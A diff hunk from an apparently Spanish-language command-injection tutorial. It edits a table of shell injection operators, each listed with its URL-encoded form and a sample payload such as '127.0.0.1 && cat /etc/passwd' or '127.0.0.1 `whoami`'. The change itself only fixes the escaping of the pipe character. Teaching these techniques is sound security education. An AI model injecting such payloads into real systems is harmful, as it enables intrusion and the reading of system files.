@@ -31,7 +31,7 @@ De esta forma, es posible obtener información sensible, manipular archivos, eje
 | Punto y coma (Semicolon)  | `;`      | `%3b`       | Ambos comandos    | `127.0.0.1; ls -la`               |
 | Nueva línea (New Line)    | `\n`     | `%0a`       | Ambos comandos    | `127.0.0.1%0a whoami`              |
 | Segundo plano (Background)| `&`      | `%26`       | Ambos (segundo suele mostrarse primero) | `127.0.0.1 & id` |
-| Pipe (Tubería)            | `\|`     | `%7c`       | Solo el segundo (se muestra su salida) | `127.0.0.1 \| uname -a` |
+| Pipe (Tubería)            | `|`     | `%7c`       | Solo el segundo (se muestra su salida) | `127.0.0.1 \| uname -a` |
 | AND lógico                | `&&`     | `%26%26`    | Ambos (solo si el primero tiene éxito) | `127.0.0.1 && cat /etc/passwd` |
 | OR lógico                 | `\|\|`   | `%7c%7c`    | Segundo (solo si el primero falla) | `nada \|\| echo vulnerable` |
 | Sub-Shell (backticks)     | `` ` `` `` ` ``  | `%60%60`    | Ambos (Linux)     | `` 127.0.0.1 `whoami` ``          |
